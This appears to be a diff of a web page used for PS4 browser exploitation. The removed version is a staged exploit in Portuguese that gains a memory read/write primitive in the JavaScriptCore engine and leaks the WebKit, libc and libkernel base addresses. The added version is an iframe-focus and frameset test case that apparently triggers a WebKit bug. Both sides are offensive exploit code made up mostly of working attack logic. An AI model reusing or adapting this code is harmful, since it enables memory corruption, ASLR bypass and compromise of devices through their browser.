@@ -1,198 +1,117 @@
-
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 13.52 Base Resolver</title>
+<meta charset="utf-8">
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
-  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
-h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
-#fw{font-size:11px;color:#555;margin-bottom:16px}
-#con{width:100%;max-width:700px;height:400px;background:#050508;border:1px solid #1a1d2e;
-  border-radius:6px;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.6}
-.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
-.e{color:#ff5252;font-weight:bold}.s{color:#00c8ff;border-top:1px solid #1a1d2e;
-  margin-top:4px;padding-top:4px}
+    html, body {
+        margin: 0;
+        padding: 0;
+    }
+
+    iframe {
+        content: url();
+        zoom: 0.01;
+        width: 300px;
+        height: 200px;
+    }
+
+    #status {
+        font-family: monospace;
+        white-space: pre;
+    }
 </style>
 </head>
+
 <body>
-<h1>PS4 13.52 Base Resolver</h1>
-<div id="fw">detectando...</div>
-<div id="con"></div>
 
-<script src="./13.52.js?v=6"></script>
-<script type="module">
-import { int64 } from './resources/int64.js';
-import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP } from './resources/mem.js';
-globalThis.int64 = int64;
+<div id="status">starting...</div>
 
-const $con = document.getElementById('con');
-const $fw  = document.getElementById('fw');
+<iframe id="i0"></iframe>
 
-function log(m, c='i') {
-  const d = document.createElement('div');
-  d.className = c; d.textContent = m;
-  $con.appendChild(d);
-  $con.scrollTop = $con.scrollHeight;
-  while ($con.children.length > 200) $con.removeChild($con.firstChild);
-}
-function logH(m) { log('=== ' + m + ' ===', 's'); }
+<script>
 
-// ── compat aliases ──
-function fixApi(p) {
-  if (!p.read4 && p.read32) p.read4 = p.read32;
-  if (!p.read8 && p.read64) p.read8 = p.read64;
-  if (!p.write4 && p.write32) p.write4 = p.write32;
-  if (!p.write8 && p.write64) p.write8 = p.write64;
-  return p;
-}
+(function () {
 
-// ── resolve WebKit base from __ps5NativeCtor ──
-function resolveWebkitBase() {
-  const ctor = globalThis.__ps5NativeCtor;
-  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
-    throw new Error('__ps5NativeCtor inválido: ' + ctor);
-  }
-  const hi = Math.floor(ctor / 0x100000000);
-  const lo = ctor - hi * 0x100000000;
-  const ctor64 = new int64(lo >>> 0, hi >>> 0);
+    var status = document.getElementById("status");
+    var frame = document.getElementById("i0");
 
-  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
-             ? OFFSET_wk_host_constructor_candidates[0] : 0x36F9E20;
-
-  const baseVal = ctor - hc;
-  const bHi = Math.floor(baseVal / 0x100000000);
-  const bLo = baseVal - bHi * 0x100000000;
-  const webkitBase = new int64(bLo >>> 0, bHi >>> 0);
-
-  log('[+] __ps5NativeCtor = 0x' + ctor64.toString(16));
-  log('[+] WebKit Base     = 0x' + webkitBase.toString(16) + ' (hc=0x' + hc.toString(16) + ')');
-  return webkitBase;
-}
-
-// ── resolve libc via GOT memset ──
-function resolveLibc(p, webkitBase) {
-  if (!OFFSET_wk_memset_import || !OFFSET_lc_memset) {
-    log('[-] OFFSET_wk_memset_import ou OFFSET_lc_memset é 0', 'w');
-    return null;
-  }
-  try {
-    const slot = webkitBase.add32(OFFSET_wk_memset_import);
-    const ptr  = p.read8(slot);
-    const libcBase = ptr.sub32(OFFSET_lc_memset);
-
-    log('[+] GOT memset slot  = wk+0x' + OFFSET_wk_memset_import.toString(16));
-    log('[+] GOT memset value   = 0x' + ptr.toString(16));
-    log('[+] libcBase           = 0x' + libcBase.toString(16));
-
-    // sanity
-    const magic = p.read4(libcBase);
-    if (magic !== 0x464C457F) {
-      log('[-] libcBase ELF magic inválido: 0x' + magic.toString(16), 'e');
-      return null;
+    function log(s) {
+        status.textContent += "\n" + s;
     }
-    if ((libcBase.low & 0xFFF) !== 0) {
-      log('[-] libcBase não page-aligned', 'e');
-      return null;
-    }
-    log('[✓] libcBase validado (ELF + aligned)', 'ok');
-    return libcBase;
-  } catch (e) {
-    log('[-] Falha libc: ' + (e.message || e), 'e');
-    return null;
-  }
-}
 
-// ── resolve libkernel via GOT __stack_chk_guard ──
-function resolveLibkernel(p, webkitBase) {
-  if (!OFFSET_wk___stack_chk_guard_import || !OFFSET_lk___stack_chk_guard) {
-    log('[-] OFFSET_wk___stack_chk_guard_import ou OFFSET_lk___stack_chk_guard é 0', 'w');
-    return null;
-  }
-  try {
-    const slot = webkitBase.add32(OFFSET_wk___stack_chk_guard_import);
-    const ptr  = p.read8(slot);
-    const lkBase = ptr.sub32(OFFSET_lk___stack_chk_guard);
+    log("iframe created");
 
-    log('[+] GOT guard slot   = wk+0x' + OFFSET_wk___stack_chk_guard_import.toString(16));
-    log('[+] GOT guard value  = 0x' + ptr.toString(16));
-    log('[+] libkernelBase    = 0x' + lkBase.toString(16));
+    /*
+     * Equivalent to the original test's focus handler.
+     */
+    frame.onfocus = function () {
+        log("iframe focus");
 
-    const magic = p.read4(lkBase);
-    if (magic !== 0x464C457F) {
-      log('[-] libkernelBase ELF magic inválido: 0x' + magic.toString(16), 'e');
-      return null;
-    }
-    if ((lkBase.low & 0xFFF) !== 0) {
-      log('[-] libkernelBase não page-aligned', 'e');
-      return null;
-    }
-    log('[✓] libkernelBase validado (ELF + aligned)', 'ok');
-    return lkBase;
-  } catch (e) {
-    log('[-] Falha libkernel: ' + (e.message || e), 'e');
-    return null;
-  }
-}
+        /*
+         * Same state transition used by the original testcase.
+         */
+        location.hash = "y";
+    };
 
-// ── main ──
-async function main() {
-  const ua = navigator.userAgent;
-  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
-  $fw.textContent = fw ? `PS4 firmware ${fw[1]}` : ua.slice(0, 50);
-  log('UA: ' + ua, 'd');
+    /*
+     * Original testcase starts at #x.
+     */
+    location.hash = "x";
 
-  logH('STAGE 1: EXPLOIT JSC');
-  let carrier;
-  try {
-    carrier = await establishPrimitive({ maxAttempts: 0 });
-  } catch (err) {
-    log('[-] core.js falhou: ' + err.message, 'e');
-    return;
-  }
-  log('[+] core.js OK', 'ok');
+    /*
+     * Force the document/render tree through several
+     * synchronous layout opportunities.
+     */
+    document.documentElement.appendChild(
+        document.createElement("frameset")
+    );
 
-  logH('STAGE 2: R/W PRIMITIVE');
-  let p;
-  try {
-    p = installWindowP(carrier, { promote: true });
-    p = fixApi(p);
-  } catch (err) {
-    log('[-] mem.js falhou: ' + err.message, 'e');
-    return;
-  }
-  log('[+] mem.js OK — window.p instalado', 'ok');
+    /*
+     * Create a script dynamically, similar to the original
+     * asynchronous trigger.
+     */
+    var script = document.createElement("script");
 
-  logH('STAGE 3: RESOLVENDO BASES');
-  let webkitBase, libcBase, lkBase;
-  try {
-    webkitBase = resolveWebkitBase();
-  } catch (e) {
-    log('[-] ' + e.message, 'e');
-    return;
-  }
+    script.onload = function () {
+        log("dynamic script loaded");
 
-  libcBase = resolveLibc(p, webkitBase);
-  lkBase   = resolveLibkernel(p, webkitBase);
+        /*
+         * Delay slightly so that style/layout/frame state
+         * has an opportunity to settle.
+         */
+        setTimeout(function () {
 
-  logH('RESULTADO');
-  log('WebKit Base     = 0x' + webkitBase.toString(16));
-  log('libkernel Base  = ' + (lkBase ? '0x' + lkBase.toString(16) : 'FALHOU'));
-  log('libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'FALHOU'));
+            log("attempting iframe.focus()");
 
-  if (lkBase && libcBase) {
-    log('[+] ===== TODAS AS BASES OK =====', 'ok');
-  } else {
-    log('[-] ===== ALGUMA BASE FALHOU =====', 'e');
-  }
-}
+            try {
+                frame.focus();
+                log("focus() returned");
+            } catch (e) {
+                log("focus exception: " + e);
+            }
 
-main();
+        }, 0);
+    };
+
+    script.onerror = function () {
+        log("dynamic script error");
+    };
+
+    /*
+     * Use a data URL so no network request is required.
+     */
+    script.src =
+        "data:text/javascript," +
+        encodeURIComponent(
+            "void 0;"
+        );
+
+    document.head.appendChild(script);
+
+})();
+
 </script>
+
 </body>
 </html>
